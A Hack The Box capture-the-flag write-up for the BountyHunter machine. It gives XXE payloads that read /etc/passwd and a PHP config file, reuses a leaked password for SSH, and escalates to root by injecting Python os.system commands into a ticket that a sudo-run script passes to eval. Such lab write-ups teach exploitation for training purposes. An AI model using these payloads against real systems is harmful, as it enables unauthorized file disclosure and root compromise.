---
title: BountyHunter
date: 2023-03-13
categories: [HackTheBox, Linux]
tags: [http, burp, xxe, ssh, python, command-injection]
img_path: /assets/img/BountyHunter/
---



This write-up is about the machine BountyHunter from Hack The Box. This machine involves some XXE injection to find the initial credentials to gain access. Then some misconfigured python commands that allow us to our user to root.



## <u>Recon</u>

As always, the first step of any box is nmap to find the open ports. 

![Nmap scan](nmap.PNG)

From this scan we can see that the machine is SSH (port 22) and HTTP (port 80). Since there is HTTP running, we'll first take a look at the website.

![Bounty Hunter Website](website.PNG)

From a first look over the website, we can see a simple web page that has a download button for a pricing guide and a contact form. In the drop-down menu in the top right, we can also see an option for a portal. Before going through anymore of the website, I will run a Gobuster scan to see if there are any extra directories to get information from. After noticing that the portal page had a `.php` extension, I included `-x PHP` in my GoBuster scan to search for additional directories that use PHP.

![Gobuster scan](gobuster.PNG)

After going through the extra directories, I found the `db.php` the most interesting as all it showed was a blank page, so there may be some PHP code running in the background. I will remember this directory for potential use later. 

My next step from here is to look at the portal page that was shown on the home page. 

![portal page](portal.PNG)

Looks like the portal is still under development so it won't be of use to us. However, there is a link to check out the bounty tracker. So, we will check that out next.

The bounty tracker contains a simple fillable form that has options for Exploit Title, CWE, CVSS Score and Bounty Reward. When this form is filled out and submitted, we receive a message that tells us that the DB isn't ready and what would have been added. 

![Bounty Tracker First Look](bountytracker.PNG)

This seems normal at first, however, as we saw earlier there was a `db.php` directory. So, if that db is not for the bounty tracker then what could it contain? 



## <u>Initial Access</u>

My next step is going to be capturing the submission of the bounty form in burp suite as it is being sent. 

From our intercepted POST request, we can see the data being sent is encoded. 

![Intercepted POST Request](burpcapture.PNG)

To know what is being sent is this POST request we will first have to decode the data being sent. Upon first look we can see that the data has been URL encoded by the `%3D`. After performing the first level of decoding, we can see that the data is still encoded. At the end of the decoded data, we can see `=` at the end which tells us that the data had also been Base64-encoded. Finally, after performing this second set of decoding we can finally see the plain data being sent.

![Decoded data](decoded.PNG)

With this newly decoded data we can see that the form is using XML (Extensible Markup Language), so we are going to perform an XXE (XML External Entity) attack. To find the syntax to perform this attack, I can use the example from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection). 

For my first test to see if the website is vulnerable to the XXE attack is by trying to grab the /etc/passwd file. 

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE file [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>2</cwe>
        <cvss>3</cvss>
        <reward>4</reward>
        </bugreport>
```

Once I have crafted my attack I can now use a tool like [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZpbGUgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPgogICAgICAgIDxidWdyZXBvcnQ%2BCiAgICAgICAgPHRpdGxlPiZmaWxlOzwvdGl0bGU%2BCiAgICAgICAgPGN3ZT4yPC9jd2U%2BCiAgICAgICAgPGN2c3M%2BMzwvY3Zzcz4KICAgICAgICA8cmV3YXJkPjQ8L3Jld2FyZD4KICAgICAgICA8L2J1Z3JlcG9ydD4) to encode it in base64 and then encode it in URL.

![First XXE encoded](firstencoded.PNG)

Now, all that is left is to send the attack. To do this, in Burp, we will send our initial intercepted request to the repeater. Next, we will change the data being sent with our own encoded attack and send it off. 

![Passwd XXE attack](xxePasswd.PNG)

Looks like we were successful!

Next, we will try to use this attack to try to view the `db.php`. As we are going to be trying to read a PHP file we will need to make an adjustment to our command. Instead of using `file://` we will need to use `php://filter/convert.base64-encode/resource=`. So, our next XXE will look a little like this:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE file [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
        <bugreport> 
        <title>&xxe;</title>
        <cwe>2</cwe>
        <cvss>3</cvss>
        <reward>4</reward>
        </bugreport>
```

After crafting the XXE, once again we need to encode it in base64 and then again in URL. After encoding, we can send it through the burp repeater and see what we get back. 

![db file decoded](dbXXE.PNG)

It looks like the `db.php` contained a to-do list with some logins. As users often like to reuse credentials, we can potentially use this information to make an attempt to login in to the SSH. Using the password `m19RoAU0hP41A1sTsq6K`that we found, I first tried the usernames contained within the same file but had no luck. The next step to try was the users listed in `/etc/passwd` that were allowed to login. One of the users that can login is `development` which upon connecting to SSH with works!

![ssh login](development.PNG)

Upon listing the directory, we can see the user flag waiting for us.

![User Flag](userflag.png)



## <u>Privilege Escalation</u>

Our next step is to try to escalate our privilege to the root account. The first thing we are going to check is what access does the development account have to sudo. We can do this by running the `sudo -l` command.

![Sudo -l command](SudoCheck.PNG)

From this command we can see that the account has access to run `Python3.8` and `ticketValidator.py` as root with no password required. We already know what Python is so we will try the `ticketValidator.py` to see what action it performs. 

When we run the `ticketValidator` we get prompted to enter the path for a ticket to check. In the same folder as the program there is a subfolder that contains invalid tickets. We will try one of these for our initial test to see what happens.

![Invalid Ticket](InvalidTicket.PNG)

After passing the program the invalid ticket we can see that it returns a destination and whether the ticket is valid or not. In order to see how this check is ran we will now look at the source code for the program.

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

Looking through the code, we can identify the check that determines if a ticket is valid or not. For a ticket to be valid it needs: 

1. A file type of .md (markdown)
2. The first line must start with `# Skytrain Inc`
3. The second line must start with `## Ticket to`
4. The third line must start with `__Ticket Code:__`
5. The next line must first start with `**`
6. After the `**` there must be an integer that must have a remainder of 4 when divided by 7

The other interesting part of this code is the `eval` function. Using this function, we can make the program run `os` commands. Since we know that we need a valid ticket to reach the `eval` function we will start by creating a valid ticket.

> We cannot write in the skytrain_inc folder so we will need to find a place where we have write access. I have used the developments home directory to create mine. {: .prompt-tip }

```
# Skytrain Inc
## Ticket to Busan
__Ticket Code:__
**11+100+50**
##Issued 13/03/2023
#End Ticket
```

After crafting the ticket, I will run it through the `ticketValidator` to make sure it returns as a valid ticket.

![Valid Ticket](ValidTicket.PNG)

Looks like we managed to create a valid ticket. Now we are going to adjust our ticket to try and use the `eval` function to run `os` commands. For our first test, we want to check the UID of the program when run with sudo. In order to do this, we will need to add `__import__('os').system('id')` to our ticket where our number is being checked like so:

```
# Skytrain Inc
## Ticket to Busan
__Ticket Code:__
**11+100+50+ __import__('os').system('id')**
##Issued 13/03/2023
#End Ticket
```

Now when we run the ticket through the validator, we should also be able to see the id number we are running at. 

![Ticket showing user ID](IDTicket.PNG)

This time we have an extra line that has been printed. This line shows that at the time of running the command we the UID of 0 which is the root. Now that we are sure that the program is running as root, we can use it to generate us a new bash shell that still has the root permissions. We will do by changing our import command to look like `__import__('os').system('/bin/bash')` .

```
# Skytrain Inc
## Ticket to Busan
__Ticket Code:__
**11+100+50+ __import__('os').system('/bin/bash')**
##Issued 13/03/2023
#End Ticket
```

After running the ticket we are given a new bash shell that kept the root access.

![Ticket giving Root Shell](ShellTicket.PNG)

Now that we are root, we can navigate to the root directory and grab our root flag.

![Root flag](RootFlag.png)
